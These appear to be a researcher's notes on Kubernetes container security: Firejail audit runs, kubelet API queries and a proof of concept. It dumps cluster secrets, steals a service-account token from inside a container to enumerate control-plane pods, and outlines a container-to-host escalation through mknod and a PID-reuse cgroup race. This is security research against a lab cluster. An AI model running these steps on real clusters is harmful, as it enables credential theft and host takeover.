
### Firejail's `faudit` run in a container

Via https://github.com/netblue30/firejail/tree/master/src/faudit

Spawned via kubernetes:
```
root@k8s-1:/home/vagrant# kubectl run -i --tty --rm --image=gcc gccy bash
root@gccy-65d8fd5c95-j544h:/# wget https://disconnect3d.pl/u/firejail.zip
root@gccy-65d8fd5c95-j544h:/# unzip firejail.zip && cd firejail/src/faudit
root@gccy-65d8fd5c95-j544h:/firejail/src/faudit# ./faudit

---------------- Firejail Audit: the GOOD, the BAD and the UGLY ----------------
INFO: starting /firejail/src/faudit/faudit.
GOOD: process 15 is running in a PID namespace.

BAD: seccomp disabled. Use "firejail --seccomp" to enable it.

BAD: the capability map is a80425fb, it should be all zero. Use "firejail --caps.drop=all" to fix it.

GOOD: I cannot access files in /root/.ssh directory.
UGLY: I can access files in /root/.gnupg directory. Use "firejail --blacklist=/root/.gnupg" to block it.
GOOD: I cannot access files in /root/.mozilla directory.
GOOD: I cannot access files in /root/.config/chromium directory.
GOOD: I cannot access files in /root/.icedove directory.
GOOD: I cannot access files in /root/.thunderbird directory.

GOOD: SSH server not available on localhost.
GOOD: HTTP server not available on localhost.
MAYBE: I can connect to netlink socket. Network utilities such as iproute2 will work fine in the sandbox. You can use "--protocol" to disable the socket.

GOOD: DBUS_SESSION_BUS_ADDRESS environment variable not configured.
GOOD: cannot open /tmp/.X11-unix directory

INFO: files visible in /dev directory: console, core, stderr, stdout, stdin, fd, ptmx, urandom, zero, tty, full, random, null, shm, termination-log, mqueue, pts,
GOOD: Access to /dev directory is restricted.
```

As a comparison, on docker:
```
$ docker run --rm -it -v `pwd`:/task ubuntu bash
root@066cb3f87752:/# /task/faudit

---------------- Firejail Audit: the GOOD, the BAD and the UGLY ----------------
INFO: starting /task/faudit.
GOOD: process 10 is running in a PID namespace.

GOOD: seccomp BPF enabled.
checking syscalls: mount...
UGLY: mount syscall permitted.
umount2...
UGLY: umount2 syscall permitted.
ptrace...
UGLY: ptrace syscall permitted.
swapon...
UGLY: swapon syscall permitted.
swapoff...
UGLY: swapoff syscall permitted.
init_module...
UGLY: init_module syscall permitted.
delete_module...
UGLY: delete_module syscall permitted.
chroot...
UGLY: chroot syscall permitted.
pivot_root...
UGLY: pivot_root syscall permitted.
iopl...
UGLY: iopl syscall permitted.
ioperm...
UGLY: ioperm syscall permitted.


BAD: the capability map is a80425fb, it should be all zero. Use "firejail --caps.drop=all" to fix it.

GOOD: I cannot access files in /root/.ssh directory.
GOOD: I cannot access files in /root/.gnupg directory.
GOOD: I cannot access files in /root/.mozilla directory.
GOOD: I cannot access files in /root/.config/chromium directory.
GOOD: I cannot access files in /root/.icedove directory.
GOOD: I cannot access files in /root/.thunderbird directory.

GOOD: SSH server not available on localhost.
GOOD: HTTP server not available on localhost.
MAYBE: I can connect to netlink socket. Network utilities such as iproute2 will work fine in the sandbox. You can use "--protocol" to disable the socket.

GOOD: DBUS_SESSION_BUS_ADDRESS environment variable not configured.
GOOD: cannot open /tmp/.X11-unix directory

INFO: files visible in /dev directory: console, core, stderr, stdout, stdin, fd, ptmx, urandom, zero, tty, full, random, null, shm, mqueue, pts,
GOOD: Access to /dev directory is restricted.

--------------------------------------------------------------------------------
root@066cb3f87752:/#
```

### todo/checkme

Interesting stuff to look around (pkg/kubelet/container/os.go:28)
```
// OSInterface collects system level operations that need to be mocked out
// during tests.
type OSInterface interface {
	MkdirAll(path string, perm os.FileMode) error
	Symlink(oldname string, newname string) error
	Stat(path string) (os.FileInfo, error)
	Remove(path string) error
	RemoveAll(path string) error
	Create(path string) (*os.File, error)
	Chmod(path string, perm os.FileMode) error
	Hostname() (name string, err error)
	Chtimes(path string, atime time.Time, mtime time.Time) error
	Pipe() (r *os.File, w *os.File, err error)
	ReadDir(dirname string) ([]os.FileInfo, error)
	Glob(pattern string) ([]string, error)
}
```

### Getting access

```
kubectl get secret --all-namespaces -o json

kubectl get secret default-token-wvpvz -o json | jq -r '.data.token' | base64 -d > token

curl -H "Authorization: Bearer $(cat ./token)" -k https://172.17.8.101:10250/pods/

```

Getting specs:
```
root@k8s-1:/home/vagrant# curl --path-as-is -H "Authorization: Bearer $(cat ./token)" -k 'https://172.17.8.101:10250/spec/'
{
  "num_cores": 1,
  "cpu_frequency_khz": 2712000,
  "memory_capacity": 2090295296,
  "hugepages": [
   {
    "page_size": 2048,
    "num_pages": 0
   }
  ],
  "machine_id": "bd80d0541a064c54bd9273ea4fb4bd2a",
  "system_uuid": "28502970-42AB-4994-B67C-73E754039C85",
  "boot_id": "07ddaf6c-c61f-4f4d-94ba-4f0ffabae854",
  "filesystems": [
   {
    "device": "/dev/sda1",
    "capacity": 486105088,
    "type": "vfs",
    "inodes": 124928,
    "has_inodes": true
   },
   {
    "device": "tmpfs",
    "capacity": 209031168,
    "type": "vfs",
    "inodes": 255163,
    "has_inodes": true
   },
   {
    "device": "/dev/sda3",
    "capacity": 31165706240,
    "type": "vfs",
    "inodes": 1941504,
    "has_inodes": true
   }
  ],
  "disk_map": {
   "8:0": {
    "name": "sda",
    "major": 8,
    "minor": 0,
    "size": 34359738368,
    "scheduler": "cfq"
   }
  },
  "network_devices": [
   {
    "name": "eth0",
    "mac_address": "08:00:27:15:89:c8",
    "speed": 1000,
    "mtu": 1500
   },
   {
    "name": "eth1",
    "mac_address": "08:00:27:04:3b:ee",
    "speed": 1000,
    "mtu": 1500
   }
  ],
  "topology": [
   {
    "node_id": 0,
    "memory": 2090295296,
    "cores": [
     {
      "core_id": 0,
      "thread_ids": [
       0
      ],
      "caches": [
       {
        "size": 32768,
        "type": "Data",
        "level": 1
       },
       {
        "size": 32768,
        "type": "Instruction",
        "level": 1
       },
       {
        "size": 262144,
        "type": "Unified",
        "level": 2
       }
      ]
     }
    ],
    "caches": [
     {
      "size": 8388608,
      "type": "Unified",
      "level": 3
     }
    ]
   }
  ],
  "cloud_provider": "Unknown",
  "instance_type": "Unknown",
  "instance_id": "None"
 }
```

Grab info about running pods:
```
root@k8s-1:/home/vagrant# curl --path-as-is -H "Authorization: Bearer $(cat ./token)" -k 'https://172.17.8.101:10250/runningpods/' | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1096  100  1096    0     0  73066      0 --:--:-- --:--:-- --:--:-- 73066
{
  "kind": "PodList",
  "apiVersion": "v1",
  "metadata": {},
  "items": [
    {
      "metadata": {
        "name": "kube-scheduler-k8s-1",
        "namespace": "kube-system",
        "uid": "27fcc12b313e7a9ff8dd8190a91acd87",
        "creationTimestamp": null
      },
      "spec": {
        "containers": [
          {
            "name": "kube-scheduler",
            "image": "gcr.io/google-containers/kube-scheduler@sha256:e7b2f9b1dcfa03b0e43b891979075d62086fe14e169de081f9c23db378f5b2f7",
            "resources": {}
          }
        ]
      },
      "status": {}
    },
    {
      "metadata": {
        "name": "kube-controller-manager-k8s-1",
        "namespace": "kube-system",
        "uid": "81df89e8053829db91bcd3db6888c5f2",
        "creationTimestamp": null
      },
      "spec": {
        "containers": [
          {
            "name": "kube-controller-manager",
            "image": "gcr.io/google-containers/kube-controller-manager@sha256:84477c0a8d0f8db87f12856d7b97c2784856caf3bc46bc9dd73f5ac219bc9d06",
            "resources": {}
          }
        ]
      },
      "status": {}
    },
    {
      "metadata": {
        "name": "kube-apiserver-k8s-1",
        "namespace": "kube-system",
        "uid": "73966cc857eb92e32c0d6cf9f97a19a4",
        "creationTimestamp": null
      },
      "spec": {
        "containers": [
          {
            "name": "kube-apiserver",
            "image": "gcr.io/google-containers/kube-apiserver@sha256:9f3c39082ceea4979edabf1c981a54c0b3e32da5243c242beffa556241e81ae5",
            "resources": {}
          }
        ]
      },
      "status": {}
    }
  ]
}
```

### Good to look for
* `.PathParameter` (via `request.PathParameter`)
* `.QueryParameter`

### PoC hijack cluster from within container

Let's create a container which runs a non privileged user:
```
$ kubectl run -i --tty --rm --image=ubuntu ubuntuu bash

$ root@ubuntuu-79c9c78889-htbpt:/# apt install jq curl
# (... output truncated)

$ root@ubuntuu-79c9c78889-htbpt:/# adduser user
Adding user `user' ...
Adding new group `user' (1001) ...
Adding new user `user' (1001) with group `user' ...
Creating home directory `/home/user' ...
Copying files from `/etc/skel' ...
Enter new UNIX password:
Retype new UNIX password:
passwd: password updated successfully
Changing the user information for user
Enter the new value, or press ENTER for the default
	Full Name []:
	Room Number []:
	Work Phone []:
	Home Phone []:
	Other []:
Is the information correct? [Y/n] Y

root@ubuntuu-79c9c78889-htbpt:/# su -l user
user@ubuntuu-79c9c78889-htbpt:~$ whoami
user
```

We can now get the token:
```
cp /var/run/secrets/kubernetes.io/serviceaccount/token ~/token
```

And use it to hijack other containers. To do it, we need to list them first:
```
user@ubuntuu-79c9c78889-htbpt:~$ curl -H "Authorization: Bearer $(cat ~/token)" -k https://172.17.8.101:10250/pods/ | jq '.items[0].metadata'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 25135    0 25135    0     0  1636k      0 --:--:-- --:--:-- --:--:-- 1636k
{
  "name": "kube-apiserver-k8s-1",
  "namespace": "kube-system",
  "selfLink": "/api/v1/namespaces/kube-system/pods/kube-apiserver-k8s-1",
  "uid": "73966cc857eb92e32c0d6cf9f97a19a4",
  "creationTimestamp": null,
  "labels": {
    "component": "kube-apiserver",
    "tier": "control-plane"
  },
  "annotations": {
    "kubernetes.io/config.hash": "73966cc857eb92e32c0d6cf9f97a19a4",
    "kubernetes.io/config.seen": "2019-04-18T11:22:37.019418502-07:00",
    "kubernetes.io/config.source": "file",
    "scheduler.alpha.kubernetes.io/critical-pod": ""
  }
}
```

### kubernetes container with default config + unpriv user on host - priv escalation to root on host

TLDR steps
```
1) container can't access host files
2) there is no `/dev/sda` in container
3) you can create `/dev/sda` via `mknod` bcoz you are root and have `MKNOD` capability
4) you can't mount the created device, because your process is in a cgroup that can't access this device (or maybe can but in Read-Only - however the mount doesn't work, so I bet you just don't have access to the device)
5) kubelet moves `docker-containerd` processes to root devices cgroup every 5 minutes - they look for this process by pidfile (wrong, old path) with a fallback to checking process name - BUT they check if process is on host - and if so, moves the PID to the cgroup
so this can be attacked as:

1) spawn `docker-containerd` process on host (as unpriv user)
2) get the time when they move the process to cgroup
3) prepare a pid reuse attack - you must be able to kill the process on host and at the same time spawn a process in container with the same pid
4) hit the attack in proper time (that's hard but I think it is doable)
5) boom, your process in container was moved to ~root~ `/systemd/system.slice` devices cgroup (edited) 
and now your process in container, being in `/systemd/system.slice` cgroup should be able to mount the device
```
